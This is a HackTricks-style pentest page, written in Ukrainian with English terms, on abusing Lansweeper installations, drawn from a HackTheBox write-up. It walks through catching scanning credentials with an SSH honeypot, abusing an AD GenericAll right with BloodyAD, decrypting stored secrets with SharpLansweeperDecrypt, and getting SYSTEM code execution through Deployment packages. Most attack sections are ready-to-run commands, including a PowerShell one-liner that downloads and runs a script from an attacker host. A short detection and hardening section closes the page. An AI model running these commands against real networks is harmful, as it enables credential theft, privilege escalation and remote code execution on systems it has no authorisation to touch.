# Зловживання Lansweeper: Збирання облікових даних, розшифрування секретів та Deployment RCE

{{#include ../../banners/hacktricks-training.md}}

Lansweeper — платформа для виявлення та інвентаризації IT-активів, яка часто розгортається на Windows і інтегрується з Active Directory. Credentials, налаштовані в Lansweeper, використовуються його скануючими рушіями для автентифікації до ресурсів по протоколах, таких як SSH, SMB/WMI і WinRM. Неправильні налаштування часто дозволяють:

- Перехоплення Credential шляхом перенаправлення scanning target на хост, керований атакуючим (honeypot)
- Зловживання AD ACLs, доступними через групи, пов’язані з Lansweeper, щоб отримати віддалений доступ
- Розшифрування на хості секретів, налаштованих у Lansweeper (connection strings та збережені scanning credentials)
- Виконання коду на керованих кінцевих точках через функцію Deployment (часто виконується як SYSTEM)

Ця сторінка підсумовує практичні робочі процеси та команди для зловживання цими поведінками під час engagement-ів.

## 1) Harvest scanning credentials via honeypot (SSH example)

Ідея: створити Scanning Target, який вказує на ваш хост, і зв’язати наявні Scanning Credentials з ним. Коли скан запуститься, Lansweeper спробує автентифікуватися цими credentials, і ваш honeypot зафіксує їх.

Огляд кроків (web UI):
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (or Single IP) = your VPN IP
- Configure SSH port to something reachable (e.g., 2022 if 22 is blocked)
- Disable schedule and plan to trigger manually
- Scanning → Scanning Credentials → ensure Linux/SSH creds exist; map them to the new target (enable all as needed)
- Click “Scan now” on the target
- Run an SSH honeypot and retrieve the attempted username/password

Example with sshesame:
```yaml
# sshesame.conf
server:
listen_address: 10.10.14.79:2022
```

```bash
# Install and run
sudo apt install -y sshesame
sshesame --config sshesame.conf
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
Перевірте захоплені creds проти сервісів DC:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Notes
- Працює аналогічно для інших протоколів, коли ви можете примусити сканер підключитися до вашого listener (SMB/WinRM honeypots тощо). SSH часто буває найпростішим.
- Багато сканерів ідентифікують себе за характерними клієнтськими банерами (наприклад, RebexSSH) і спробують виконати нешкідливі команди (uname, whoami тощо).

## 2) AD ACL abuse: отримайте віддалений доступ, додавши себе до групи app-admin

Використовуйте BloodHound для переліку ефективних прав з компрометованого облікового запису. Частим знаходженням є група, специфічна для сканера або додатку (наприклад, “Lansweeper Discovery”), що має GenericAll над привілейованою групою (наприклад, “Lansweeper Admins”). Якщо привілейована група також є членом “Remote Management Users”, WinRM стає доступним після того, як ми додамо себе.

Collection examples:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
Exploit GenericAll на групі за допомогою BloodyAD (Linux):
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Потім отримайте interactive shell:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Порада: операції Kerberos чутливі до часу. Якщо ви отримали KRB_AP_ERR_SKEW, спочатку синхронізуйте час з DC:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Розшифрування секретів, налаштованих у Lansweeper, на хості

На сервері Lansweeper сайт ASP.NET зазвичай зберігає зашифрований connection string та symmetric key, які використовуються додатком. Маючи відповідний local access, ви можете розшифрувати DB connection string і потім витягти збережені scanning credentials.

Типові розташування:
- Web config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Application key: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Використовуйте SharpLansweeperDecrypt для автоматизації дешифрування та вивантаження збережених облікових даних:
```powershell
# From a WinRM session or interactive shell on the Lansweeper host
# PowerShell variant
Upload-File .\LansweeperDecrypt.ps1 C:\ProgramData\LansweeperDecrypt.ps1   # depending on your shell
powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
# Tool will:
#  - Decrypt connectionStrings from web.config
#  - Connect to Lansweeper DB
#  - Decrypt stored scanning credentials and print them in cleartext
```
Очікуваний вивід включає DB connection details та plaintext scanning credentials, такі як Windows і Linux accounts, що використовуються по всій інфраструктурі. Вони часто мають підвищені локальні права на domain hosts:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
Використовуйте відновлені Windows scanning creds для отримання привілейованого доступу:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

Як член “Lansweeper Admins”, веб-інтерфейс відкриває розділи Deployment і Configuration. У Deployment → Deployment packages можна створювати пакети, які виконують довільні команди на цільових ресурсах. Виконання здійснюється службою Lansweeper з високими привілеями, що призводить до виконання коду як NT AUTHORITY\SYSTEM на вибраному хості.

High-level steps:
- Створіть новий Deployment package, який запускає PowerShell або cmd one-liner (reverse shell, add-user тощо).
- Виберіть потрібний asset (наприклад, DC/host, де працює Lansweeper) і натисніть Deploy/Run now.
- Отримайте shell під SYSTEM.

Example payloads (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Дії з розгортання шумні й залишають журнали в Lansweeper та журнали подій Windows. Використовуйте обережно.

## Виявлення та укріплення

- Обмежте або видаліть анонімну енумерацію SMB. Моніторьте RID cycling та аномальний доступ до спільних ресурсів Lansweeper.
- Контроль вихідного трафіку: блокувати або суворо обмежувати вихідні SSH/SMB/WinRM з хостів-сканерів. Сповіщати про нестандартні порти (наприклад, 2022) та незвичайні клієнтські банери, як Rebex.
- Захистіть `Website\\web.config` та `Key\\Encryption.txt`. Виносьте секрети у vault і обертайте їх при компрометації. Розгляньте сервісні облікові записи з мінімальними привілеями та gMSA там, де це доцільно.
- Моніторинг AD: сповіщення про зміни в групах, пов'язаних з Lansweeper (наприклад, “Lansweeper Admins”, “Remote Management Users”), та про зміни ACL, що надають GenericAll/Write членство в привілейованих групах.
- Аудит створення/змін/виконань Deployment package; сповіщайте про пакети, які запускають cmd.exe/powershell.exe або встановлюють несподівані вихідні з'єднання.

## Супутні теми
- SMB/LSA/SAMR enumeration and RID cycling
- Kerberos password spraying and clock skew considerations
- BloodHound path analysis of application-admin groups
- WinRM usage and lateral movement

## References
- [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [BloodHound CE](https://github.com/SpecterOps/BloodHound)

{{#include ../../banners/hacktricks-training.md}}
